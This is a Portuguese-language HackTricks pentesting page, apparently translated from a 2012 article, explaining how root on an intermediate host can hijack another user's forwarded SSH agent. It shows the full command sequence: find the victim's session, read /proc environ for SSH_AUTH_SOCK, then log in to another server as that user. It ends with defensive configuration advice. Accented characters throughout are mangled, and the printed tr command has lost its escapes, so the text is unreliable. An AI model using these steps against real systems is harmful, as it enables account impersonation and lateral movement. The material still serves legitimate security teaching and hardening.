# Resumo

O que voc√™ pode fazer se descobrir dentro da configura√ß√£o `/etc/ssh_config` ou dentro de `$HOME/.ssh/config` isso:
```
ForwardAgent yes
```
Se voc√™ √© root dentro da m√°quina, provavelmente pode **acessar qualquer conex√£o ssh feita por qualquer agente** que voc√™ possa encontrar no diret√≥rio _/tmp_

Impersonate Bob usando um dos ssh-agent de Bob:
```bash
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
```
## Por que isso funciona?

Quando voc√™ define a vari√°vel `SSH_AUTH_SOCK`, voc√™ est√° acessando as chaves de Bob que foram usadas na conex√£o ssh de Bob. Ent√£o, se sua chave privada ainda estiver l√° (normalmente estar√°), voc√™ poder√° acessar qualquer host usando-a.

Como a chave privada √© salva na mem√≥ria do agente sem criptografia, suponho que se voc√™ for Bob, mas n√£o souber a senha da chave privada, ainda poder√° acessar o agente e us√°-lo.

Outra op√ß√£o √© que o usu√°rio propriet√°rio do agente e o root possam acessar a mem√≥ria do agente e extrair a chave privada.

# Explica√ß√£o longa e explora√ß√£o

**Retirado de:** [**https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/**](https://www.clockwork.com/news/2012/09/28/602/ssh\_agent\_hijacking/)

## **Quando ForwardAgent n√£o pode ser confi√°vel**

O SSH sem senhas torna a vida com sistemas operacionais semelhantes ao Unix muito mais f√°cil. Se sua rede requer sess√µes ssh encadeadas (para acessar uma rede restrita, por exemplo), o encaminhamento do agente se torna extremamente √∫til. Com o encaminhamento do agente, √© poss√≠vel para mim conectar do meu laptop ao meu servidor de desenvolvimento e de l√° executar um checkout svn de outro servidor, tudo sem senhas, mantendo minha chave privada segura em minha esta√ß√£o de trabalho local.

Isso pode ser perigoso, no entanto. Uma r√°pida pesquisa na web revelar√° v√°rios artigos indicando que isso s√≥ √© seguro se os hosts intermedi√°rios forem confi√°veis. Raramente, no entanto, voc√™ encontrar√° uma explica√ß√£o do _porqu√™_ √© perigoso.

√â para isso que este artigo serve. Mas primeiro, um pouco de contexto.

## **Como funciona a autentica√ß√£o sem senha**

Ao autenticar no modo normal, o SSH usa sua senha para provar que voc√™ √© quem diz ser. O servidor compara um hash desta senha com um que ele tem em arquivo, verifica se os hashes correspondem e permite que voc√™ entre.

Se um invasor conseguir quebrar a criptografia usada para proteger sua senha enquanto ela est√° sendo enviada para o servidor, ele pode roub√°-la e fazer login como voc√™ sempre que desejar. Se um invasor puder realizar centenas de milhares de tentativas, ele eventualmente poder√° adivinhar sua senha.

Um m√©todo de autentica√ß√£o muito mais seguro √© a [autentica√ß√£o de chave p√∫blica](http://www.ibm.com/developerworks/library/l-keyc/index.html), uma maneira de fazer login sem senha. A autentica√ß√£o de chave p√∫blica requer um par correspondente de chaves p√∫blica e privada. A chave p√∫blica criptografa mensagens que s√≥ podem ser descriptografadas com a chave privada. O computador remoto usa sua c√≥pia da sua chave p√∫blica para criptografar uma mensagem secreta para voc√™. Voc√™ prova que √© voc√™ descriptografando a mensagem usando sua chave privada e enviando a mensagem de volta para o computador remoto. Sua chave privada permanece segura em seu computador local o tempo todo, protegida contra ataques.

A chave privada √© valiosa e deve ser protegida, portanto, por padr√£o, ela √© armazenada em um formato criptografado. Infelizmente, isso significa inserir sua frase de senha antes de us√°-la. Muitos artigos sugerem usar chaves privadas sem frase de senha (n√£o criptografadas) para evitar esse inconveniente. Isso √© uma m√° ideia, pois qualquer pessoa com acesso √† sua esta√ß√£o de trabalho (por acesso f√≠sico, roubo ou hackeamento) agora tamb√©m tem acesso gratuito a qualquer computador configurado com sua chave p√∫blica.

O OpenSSH inclui [ssh-agent](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent), um daemon que √© executado em sua esta√ß√£o de trabalho local. Ele carrega uma c√≥pia descriptografada de sua chave privada na mem√≥ria, para que voc√™ s√≥ precise inserir sua frase de senha uma vez. Ele fornece um [socket](http://en.wikipedia.org/wiki/Unix\_domain\_socket) local que o cliente ssh pode usar para pedir que ele descriptografe a mensagem criptografada enviada de volta pelo servidor remoto. Sua chave privada permanece segura no processo do ssh-agent, permitindo que voc√™ fa√ßa ssh sem digitar senhas.

## **Como ForwardAgent funciona**

Muitas tarefas exigem sess√µes ssh "encadeadas". Considere meu exemplo anterior: eu fa√ßo ssh do meu laptop para o servidor de desenvolvimento. L√°, preciso executar uma atualiza√ß√£o svn, usando o protocolo "svn+ssh". Como seria bobo deixar uma c√≥pia n√£o criptografada da minha chave privada supersecreta em um servidor compartilhado, agora estou preso com autentica√ß√£o por senha. No entanto, se eu habilitar "ForwardAgent" na configura√ß√£o ssh em meu laptop, o ssh usa suas capacidades de tunelamento embutidas para criar outro socket no servidor de desenvolvimento que √© tunelado de volta para o socket ssh-agent em minha esta√ß√£o de trabalho local. Isso significa que o cliente ssh no servidor de desenvolvimento agora pode enviar solicita√ß√µes de "descriptografar esta mensagem secreta" diretamente de volta para o ssh-agent em execu√ß√£o em minha esta√ß√£o de trabalho, autenticando-se para o servidor svn sem nunca ter acesso √† minha chave privada.

## **Por que isso pode ser perigoso**

Simplesmente, qualquer pessoa com privil√©gios de root no servidor intermedi√°rio pode fazer uso gratuito do seu ssh-agent para autentic√°-los em outros servidores. Uma demonstra√ß√£o simples mostra o qu√£o trivialmente isso pode ser feito. Os nomes de host e usu√°rios foram alterados para proteger os inocentes.

Meu laptop est√° executando ssh-agent, que se comunica com os programas cliente ssh por meio de um socket. O caminho para este soquete √© armazenado na vari√°vel de ambiente SSH\_AUTH\_SOCK:
```
mylaptop:~ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/launch-oQKpeY/Listeners

mylaptop:~ ls -l /tmp/launch-oQKpeY/Listeners
srwx------  1 alice  wheel  0 Apr  3 11:04 /tmp/launch-oQKpeY/Listeners
```
O programa [ssh-add](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add) nos permite visualizar e interagir com chaves no agente:
```
mylaptop:~ alice$ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
Eu tenho "ForwardAgent yes" no \~/.ssh/config no meu laptop. Ent√£o, o ssh vai criar um t√∫nel conectando o socket local a um socket local no servidor remoto:
```
mylaptop:~ alice$ ssh seattle

seattle:~ $ env|grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-WsKcHa9990/agent.9990
```
Mesmo que minhas chaves n√£o estejam instaladas em "seattle", os programas clientes ssh ainda s√£o capazes de acessar o agente em execu√ß√£o na minha m√°quina local:
```
seattle:~ alice $ ssh-add -l
2048 2c:2a:d6:09:bb:55:b3:ca:0c:f1:30:f9:d9:a3:c6:9e /Users/alice/.ssh/id_rsa (RSA)
```
Ent√£o... com quem podemos mexer?
```
seattle:~ alice $ who
alice   pts/0        2012-04-06 18:24 (office.example.com)
bob     pts/1        2012-04-03 01:29 (office.example.com)
alice   pts/3        2012-04-06 18:31 (office.example.com)
alice   pts/5        2012-04-06 18:31 (office.example.com)
alice   pts/6        2012-04-06 18:33 (office.example.com)
charlie pts/23       2012-04-06 13:10 (office.example.com)
charlie pts/27       2012-04-03 12:32 (office.example.com)
bob     pts/29       2012-04-02 10:58 (office.example.com)
```
Eu nunca gostei do Bob. Para encontrar sua conex√£o de agente, eu preciso encontrar o processo filho de uma de suas sess√µes ssh:
```
seattle:~ alice $ sudo -s
[sudo] password for alice:

seattle:~ root # pstree -p bob
sshd(16816)‚îÄ‚îÄ‚îÄbash(16817)

sshd(25296)‚îÄ‚îÄ‚îÄbash(25297)‚îÄ‚îÄ‚îÄvim(14308)
```
Existem v√°rias maneiras para o root visualizar o ambiente de um processo em execu√ß√£o. No Linux, os dados est√£o dispon√≠veis em /proc/\<pid>/environ. Como eles s√£o armazenados em strings terminadas em NULL, usarei o comando tr para converter os NULLs em novas linhas:
```
seattle:~ root # tr '' 'n' < /proc/16817/environ | grep SSH_AUTH_SOCK
SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816
```
Agora tenho tudo o que preciso saber para sequestrar o ssh-agent do Bob:
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh-add -l
2048 05:f1:12:f2:e6:ad:cb:0b:60:e3:92:fa:c3:62:19:17 /home/bob/.ssh/id_rsa (RSA)
```
Se eu tiver um alvo espec√≠fico em mente, agora devo ser capaz de me conectar diretamente. Caso contr√°rio, apenas observar a lista de processos ou pesquisar no arquivo de hist√≥rico de Bob deve apresentar muitos alvos de oportunidade. Neste caso, eu sei que Bob tem todos os tipos de arquivos super secretos armazenados no servidor chamado "boston":
```
seattle:~ root # SSH_AUTH_SOCK=/tmp/ssh-haqzR16816/agent.16816 ssh bob@boston
bob@boston:~$ whoami
bob
```
Consegui com sucesso usar meus privil√©gios de root em "Seattle" para acessar como Bob em "Boston". Aposto que posso us√°-lo para demiti-lo.

## **Proteja-se!**

N√£o permita que seu ssh-agent armazene suas chaves indefinidamente. No OS X, configure sua Keychain para bloquear ap√≥s inatividade ou quando a tela √© bloqueada. Em outras plataformas Unix, passe a op√ß√£o -t para ssh-agent para que suas chaves sejam removidas ap√≥s segundos.

N√£o habilite o encaminhamento do agente ao se conectar a hosts n√£o confi√°veis. Felizmente, a sintaxe \~/.ssh/config torna isso bastante simples:
```
Host trustworthyhost
  ForwardAgent yes
```

```
Host *
  ForwardAgent no
```
## **Leitura recomendada**

* [Gerenciamento de chaves OpenSSH](http://www.ibm.com/developerworks/library/l-keyc/index.html) - Daniel Robbins
* [Um guia ilustrado para o encaminhamento do agente SSH](http://www.unixwiz.net/techtips/ssh-agent-forwarding.html) - Steve Friedl
* [Manual do ssh-agent](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-agent)
* [Manual do ssh-add](http://www.openbsd.org/cgi-bin/man.cgi?query=ssh-add)


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [reposit√≥rio hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
